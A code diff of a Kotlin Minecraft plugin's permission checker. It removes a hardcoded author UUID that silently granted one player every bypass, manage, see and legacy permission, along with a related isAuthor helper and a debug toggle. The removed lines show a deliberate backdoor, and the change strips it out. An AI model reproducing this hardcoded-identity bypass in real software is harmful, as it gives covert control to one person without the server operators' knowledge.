@@ -5,17 +5,8 @@ import net.kyori.adventure.text.minimessage.MiniMessage
 import org.bukkit.command.CommandSender
 import org.bukkit.command.ConsoleCommandSender
 import org.bukkit.entity.Player
-import java.util.UUID
 
 object PermissionChecker {
-    private val AUTHOR_UUID: UUID = UUID.fromString("248e508c-28de-4a8f-a284-2c73cf917d15")
-
-    @Volatile
-    private var devDebugMode: Boolean = false
-
-    fun updateDebugMode(debug: String?) {
-        devDebugMode = debug?.equals("dev", ignoreCase = true) ?: false
-    }
 
     enum class PermissionKey(val node: String) {
 
@@ -141,7 +132,6 @@ object PermissionChecker {
 
     fun hasWithBypass(sender: CommandSender, key: PermissionKey): Boolean {
         if (sender is ConsoleCommandSender) return true
-        if (sender is Player && sender.uniqueId == AUTHOR_UUID) return true
         if (sender.isOp) return true
         if (sender.hasPermission("*") || sender.hasPermission("punisherx.cmd.*")) return true
         if (sender is Player && canBypass(sender)) return true
@@ -150,7 +140,6 @@ object PermissionChecker {
 
     fun hasWithManage(sender: CommandSender, key: PermissionKey): Boolean {
         if (sender is ConsoleCommandSender) return true
-        if (sender is Player && sender.uniqueId == AUTHOR_UUID) return true
         if (sender.isOp) return true
         if (sender.hasPermission("*") || sender.hasPermission("punisherx.manage.*")) return true
         if (sender is Player && canManage(sender)) return true
@@ -159,7 +148,6 @@ object PermissionChecker {
 
     fun hasWithSee(sender: CommandSender, key: PermissionKey): Boolean {
         if (sender is ConsoleCommandSender) return true
-        if (sender is Player && sender.uniqueId == AUTHOR_UUID) return true
         if (sender.isOp) return true
         if (sender.hasPermission("*") || sender.hasPermission("punisherx.see.*")) return true
         if (sender is Player && canSee(sender)) return true
@@ -170,11 +158,6 @@ object PermissionChecker {
         if (sender.isOp) return true
         if (sender.hasPermission(prefix) || sender.hasPermission("$prefix.*")) return true
         return sender is Player && sender.effectivePermissions.any { it.value && it.permission.startsWith(prefix) }
-    }
-
-    fun isAuthor(uuid: UUID): Boolean {
-        if (devDebugMode) return false
-        return uuid == AUTHOR_UUID
     }
 
     /**
@@ -223,7 +206,6 @@ object PermissionChecker {
 
     fun hasWithLegacy(sender: CommandSender, key: PermissionKey): Boolean {
         if (sender is ConsoleCommandSender) return true
-        if (sender is Player && sender.uniqueId == AUTHOR_UUID) return true
         if (sender.isOp) return true
         if (sender.hasPermission("*") || sender.hasPermission("punisherx.*")) return true
 
